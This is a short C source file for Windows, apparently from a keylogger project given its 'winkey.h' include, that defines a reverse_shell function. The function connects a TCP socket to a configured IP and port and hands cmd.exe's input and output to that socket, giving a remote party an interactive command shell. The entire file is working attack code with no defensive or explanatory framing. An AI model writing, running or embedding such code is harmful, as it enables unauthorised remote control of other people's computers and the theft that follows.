#include "winkey.h"

#pragma comment(lib, "ws2_32.lib")

void	reverse_shell(void)
{
	WSADATA wsaData = { 0 };
	SOCKET wSock = 0;
	struct sockaddr_in sockaddr = { 0 };
	STARTUPINFO sui = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	
	if (WSAStartup(MAKEWORD(2, 2), &wsaData))
		return;
	wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
	if (wSock == INVALID_SOCKET)
		return;
	sockaddr.sin_family = AF_INET;
	sockaddr.sin_port = htons(PORT);
	sockaddr.sin_addr.s_addr = inet_addr(IP);
	
	if (WSAConnect(wSock, (SOCKADDR*)&sockaddr, sizeof(sockaddr), 0, 0, 0, 0) == SOCKET_ERROR)
		return;
	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = STARTF_USESTDHANDLES;
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;
	CreateProcess(0, "cmd.exe", 0, 0, TRUE, 0, 0, 0, &sui, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);
}